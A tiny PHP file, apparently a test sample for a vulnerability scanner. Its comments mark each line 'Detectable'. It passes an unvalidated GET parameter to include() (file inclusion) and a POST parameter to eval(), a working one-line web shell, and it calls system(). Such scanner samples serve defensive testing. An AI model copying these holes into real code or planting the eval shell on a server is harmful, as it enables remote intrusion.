<?php
$page = $_GET['page'];
include($page); // LFI/RFI Detectable

eval($_POST['cmd']); // RCE Detectable
system("ls -la"); // Comando de sistema Detectable
?>